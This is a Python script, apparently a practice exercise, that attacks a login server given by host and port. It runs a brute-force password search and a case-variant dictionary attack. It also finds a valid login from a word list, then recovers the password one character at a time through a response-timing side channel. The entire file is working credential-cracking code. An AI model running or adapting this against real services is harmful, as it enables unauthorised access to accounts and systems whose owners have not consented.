import sys
import socket
import itertools
import json

from datetime import datetime


class Hacker:
    def __init__(self, host, port):
        self.address = (host, port)

    def get_connection(self):
        socket_connection = socket.socket()
        socket_connection.connect(self.address)
        return socket_connection

    def send_message(self, socket_connection, message):
        socket_connection.send(message.encode())

    def get_response(self, socket_connection):
        response = socket_connection.recv(1024)
        return response.decode()

    def close(self, socket_connection):
        socket_connection.close()

    def find_password_brute_force(self, socket_connection, password_characters):
        password_length = 1
        count = 0
        while count < 1000000:
            for password in itertools.product(password_characters, repeat=password_length):
                password_str = "".join(password)
                self.send_message(socket_connection, password_str)
                response = self.get_response(socket_connection)
                if response == 'Connection success!':
                    return password_str
                elif response == 'Too many attempts':
                    return ""
                else:
                    pass
                count += 1
            password_length += 1

    def find_common_passwords(self, socket_connection, password_file):
        f = open(password_file, 'r')
        password = f.readline()
        while password:
            password = password.strip()
            password_map = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in password)))
            for password_str in password_map:
                self.send_message(socket_connection, password_str)
                response = self.get_response(socket_connection)
                if response == 'Connection success!':
                    return password_str
                elif response == 'Too many attempts':
                    return ""
                else:
                    pass
            password = f.readline()
        f.close()

    def find_password_starts_with(self, socket_connection, login):
        pass

    def find_user_id_password(self, socket_connection, logins_file, password_chars):
        f = open(logins_file, 'r')
        login_try = f.readline()
        login = ""
        while login_try:
            login_try = login_try.strip()
            self.send_message(socket_connection, '{"login": "' + login_try + '", "password": ""}')
            response = self.get_response(socket_connection)
            if "Wrong password!" in response or "Exception happened during login" in response:
                login = login_try
                break
            login_try = f.readline()
        f.close()

        index = 0
        last_password_try = ""
        password = ""
        while True:
            password_try = last_password_try + password_chars[index]
            self.send_message(socket_connection, '{"login": "' + login_try + '", "password": "' + password_try + '"}')
            start = datetime.now()
            response = self.get_response(socket_connection)
            finish = datetime.now()
            difference = (finish - start).microseconds
            if "Connection success!" in response:
                password = password_try
                break
            if "Wrong password!" in response and difference >= 75000:
                last_password_try = password_try
                index = 0
            else:
                index += 1
        return json.dumps({"login": login, "password": password})


def main():
    args = sys.argv[1:]
    host = args[0]
    port = int(args[1])
    hacker = Hacker(host, port)
    socket_connection = hacker.get_connection()
    # password = hacker.find_password_brute_force(socket_connection, "abcdefghijklmnopqrstuvwxyz0123456789")
    # password = hacker.find_common_passwords(socket_connection, "passwords.txt")
    credentials = hacker.find_user_id_password(socket_connection, "logins.txt",
                                               "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
    print(credentials)
    hacker.close(socket_connection)


main()
